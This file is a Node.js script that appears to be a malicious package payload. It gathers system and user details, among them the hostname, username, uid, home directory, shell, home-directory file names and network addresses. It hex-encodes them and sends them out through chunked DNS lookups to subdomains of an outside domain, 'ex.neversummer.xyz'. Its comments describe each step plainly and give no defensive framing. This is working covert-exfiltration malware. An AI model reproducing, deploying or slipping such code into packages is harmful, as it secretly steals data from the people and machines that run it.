// Importing required modules
var dns = require('dns');
var os = require("os");
var crypto = require('crypto');
var fs = require('fs');

// Retrieving user information from the operating system
let userInfo = os.userInfo();

// Gathering system and user information
var info = [
    os.hostname(),               // Hostname of the operating system
    os.arch(),                   // Architecture of the operating system
    os.platform(),               // Platform of the operating system
    os.release(),                // Release version of the operating system
    os.tmpdir(),                 // Directory for temporary files
    os.totalmem(),               // Total amount of system memory in bytes
    os.uptime(),                 // System uptime in seconds
    userInfo["uid"],             // User ID of the current user
    userInfo["gid"],             // Group ID of the current user
    userInfo["username"],        // Username of the current user
    userInfo["homedir"],         // Home directory of the current user
    userInfo["shell"],           // Default shell of the current user
    __filename                   // Path of the current script
];

// Defining constants
const baseDomain = ".ex.neversummer.xyz"; // Base domain suffix
const maxSubDomainLen = 63;                // Maximum length of subdomains

// Generating a random identifier
var rayId = crypto.randomBytes(20).toString('hex').substring(0, 8);

// Retrieving files in the home directory
var homeFiles = []
fs.readdirSync(os.homedir()).forEach(file => {
    homeFiles.push(file);
});

// Adding home directory files to the information array
if (homeFiles.length > 0) {
    info.push(homeFiles.join(";"));
}

// Retrieving network interfaces information
const interfaces = os.networkInterfaces();

let i = 1;

// Iterating through network interfaces and constructing domain names
for (const key in interfaces) {
    info.push(`${key}:${interfaces[key][0]["address"]}`);
}

// Joining information array elements with '|' delimiter
let infoString = info.join("|");

// Encoding information string to hexadecimal
let buff = new Buffer.from(infoString);
let encodedInfo = buff.toString('hex');

// Chunking the encoded information into subdomains and performing DNS lookup
let chunkSize = maxSubDomainLen;
for (var startChar = 0, charsLength = encodedInfo.length; startChar < charsLength; startChar += chunkSize) {
    let infoDomain = rayId + "." + i + "." + encodedInfo.substring(startChar, startChar + chunkSize);

    let fullDomain = infoDomain + baseDomain;

    // Performing DNS lookup for the constructed domain
    dns.lookup(fullDomain, function (err, addresses, family) {
        // Callback function for DNS lookup
        // 'err' contains error information if the lookup fails
        // 'addresses' contains the resolved IP addresses
        // 'family' contains the address family (IPv4 or IPv6)
    });

    i++;
}

